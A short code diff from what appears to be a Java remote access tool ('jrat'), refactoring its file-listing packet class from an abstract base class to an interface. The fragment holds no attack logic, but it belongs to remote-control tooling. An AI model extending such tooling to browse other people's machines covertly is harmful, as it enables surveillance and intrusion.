@@ -1,14 +1,14 @@
 package jrat.module.fs.packets;
 
 import jrat.client.Connection;
-import jrat.client.packets.outgoing.AbstractOutgoingPacket;
+import jrat.client.packets.outgoing.OutgoingPacket;
 
 import java.io.File;
 import java.util.Calendar;
 import java.util.Date;
 
 
-public class Packet22ListFiles extends AbstractOutgoingPacket {
+public class Packet22ListFiles implements OutgoingPacket {
 
 	private File[] files;
 
